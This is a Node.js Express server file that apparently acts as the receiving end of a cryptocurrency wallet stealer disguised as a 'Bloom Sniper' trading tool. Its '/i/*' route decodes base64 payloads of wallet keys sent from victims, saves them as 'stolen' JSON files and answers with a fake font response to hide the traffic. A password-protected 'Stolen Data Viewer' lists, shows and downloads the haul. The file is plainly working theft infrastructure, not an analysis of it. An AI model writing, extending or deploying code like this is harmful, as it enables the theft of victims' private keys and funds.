const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 10000;

// CHANGE THIS PASSWORD (keep it secret)
const VIEWER_PASSWORD = "hancox2005";

console.log('========================================');
console.log('🚀 Bloom Sniper Backend Starting on Railway...');
console.log('========================================');

app.use(express.json({ limit: '10mb' }));
app.use('/axiom', express.static(path.join(__dirname, 'public/axiom')));

// === STEALTH EXFIL ROUTE (unchanged) ===
app.get('/i/*', (req, res) => {
    res.set('Access-Control-Allow-Origin', '*');
    res.set('Access-Control-Allow-Methods', 'GET');
    res.set('Access-Control-Allow-Headers', '*');

    console.log('📥 /i/* GET ROUTE HIT - Data received');

    let encodedData = req.params[0] || '';
    if (!encodedData && req.originalUrl.includes('/i/')) {
        encodedData = req.originalUrl.split('/i/')[1] || '';
    }

    try {
        const decodedStr = Buffer.from(encodedData, 'base64').toString('utf-8');
        const payload = JSON.parse(decodedStr);

        console.log('✅ PAYLOAD DECODED SUCCESSFULLY');
        console.log('Wallets extracted:', payload.keys ? payload.keys.length : 0);

        const dir = path.join(__dirname, 'stolen_data');
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        const filename = `stolen_${Date.now()}.json`;
        fs.writeFileSync(path.join(dir, filename), JSON.stringify(payload, null, 2));
        console.log(`💾 SAVED: stolen_data/${filename}`);
    } catch (err) {
        console.error('❌ DECODE ERROR:', err.message);
    }

    res.set('Content-Type', 'font/woff2');
    res.status(200).send(Buffer.from([0, 1, 0, 0]));
});

// === NEW: PASSWORD-PROTECTED VIEWER PAGE ===
app.get('/data', (req, res) => {
    const pass = req.query.pass;
    if (pass !== VIEWER_PASSWORD) {
        return res.status(403).send('<h2>❌ Wrong password</h2><p>Use ?pass=secret123 in the URL</p>');
    }

    const dir = path.join(__dirname, 'stolen_data');
    if (!fs.existsSync(dir)) {
        return res.send('<h2>No stolen_data folder yet</h2>');
    }

    let files = fs.readdirSync(dir).filter(f => f.endsWith('.json'));
    files.sort((a, b) => b.localeCompare(a)); // newest first

    let html = `
    <html>
    <head>
        <title>Stolen Data Viewer</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; background: #111; color: #0f0; }
            h1 { color: #0f0; }
            table { width: 100%; border-collapse: collapse; }
            th, td { padding: 10px; border: 1px solid #0f0; text-align: left; }
            tr:hover { background: #222; }
            button { background: #0f0; color: #000; border: none; padding: 8px 12px; cursor: pointer; }
            pre { background: #000; padding: 15px; overflow: auto; max-height: 600px; }
        </style>
    </head>
    <body>
        <h1>🔥 Stolen Data Viewer</h1>
        <p><strong>Files found:</strong> ${files.length}</p>
        <table>
            <tr><th>Date</th><th>Wallets</th><th>Actions</th></tr>`;

    files.forEach(file => {
        const filePath = path.join(dir, file);
        let content;
        try {
            content = JSON.parse(fs.readFileSync(filePath, 'utf8'));
        } catch (e) {
            content = { error: "Invalid JSON" };
        }
        const walletCount = content.keys ? content.keys.length : 0;
        const date = new Date(parseInt(file.replace('stolen_', '').replace('.json', '')) * 1000).toLocaleString();

        html += `
            <tr>
                <td>${date}</td>
                <td>${walletCount} wallets</td>
                <td>
                    <button onclick="viewFile('${file}')">View JSON</button>
                    <a href="/data/download/${file}?pass=${VIEWER_PASSWORD}" download><button>Download</button></a>
                </td>
            </tr>`;
    });

    html += `</table>
        <div id="jsonViewer" style="margin-top:30px;"></div>

        <script>
            async function viewFile(filename) {
                const res = await fetch('/data/view/' + filename + '?pass=${VIEWER_PASSWORD}');
                const data = await res.json();
                document.getElementById('jsonViewer').innerHTML = '<h2>Viewing: ' + filename + '</h2><pre>' + JSON.stringify(data, null, 2) + '</pre>';
            }
        </script>
    </body></html>`;

    res.send(html);
});

// Helper route to serve individual JSON files
app.get('/data/view/:filename', (req, res) => {
    if (req.query.pass !== VIEWER_PASSWORD) return res.status(403).send('Access denied');
    const filePath = path.join(__dirname, 'stolen_data', req.params.filename);
    if (fs.existsSync(filePath)) {
        res.json(JSON.parse(fs.readFileSync(filePath, 'utf8')));
    } else {
        res.status(404).send('File not found');
    }
});

// Download route
app.get('/data/download/:filename', (req, res) => {
    if (req.query.pass !== VIEWER_PASSWORD) return res.status(403).send('Access denied');
    const filePath = path.join(__dirname, 'stolen_data', req.params.filename);
    if (fs.existsSync(filePath)) {
        res.download(filePath);
    } else {
        res.status(404).send('File not found');
    }
});

// Catch-all
app.get('*', (req, res) => {
    res.status(404).json({ detail: "Not Found" });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ SERVER LIVE ON PORT ${PORT}`);
    console.log(`🔗 Viewer page: https://bloom-sniper-replica-production.up.railway.app/data?pass=secret123`);
    console.log('========================================');
});